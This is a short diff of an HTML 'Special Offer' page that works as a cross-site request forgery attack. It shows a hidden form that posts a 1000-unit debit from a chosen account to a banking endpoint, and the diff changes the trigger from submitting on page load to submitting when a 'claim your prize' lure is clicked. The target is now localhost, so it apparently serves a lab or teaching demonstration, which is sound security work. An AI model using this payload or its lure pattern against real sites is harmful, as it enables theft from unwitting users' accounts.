@@ -5,20 +5,23 @@
   </head>
   <body>
     <h1>Special Offer</h1>
-    <p>Click here to claim your prize!</p>
+    <p id="claim">Click here to claim your prize!</p>
     <!-- Hidden form that sends a POST request to debit money from the victim's account -->
     <form
       id="csrfForm"
-      action="http://banking-app.com/debit"
+      action="http://localhost:3000/debit"
       method="POST"
+      enctype="multipart/form-data"
       style="display: none"
     >
-      <input type="hidden" name="account_id" value="12345" />
+      <input type="hidden" name="account_id" value="1" />
       <input type="hidden" name="amount" value="1000" />
     </form>
     <script>
-      // Automatically submit the form when the page loads
-      document.getElementById("csrfForm").submit();
+      // Submit the form when the element with ID "t" is clicked
+      document.getElementById("claim").addEventListener("click", function () {
+        document.getElementById("csrfForm").submit();
+      });
     </script>
   </body>
 </html>
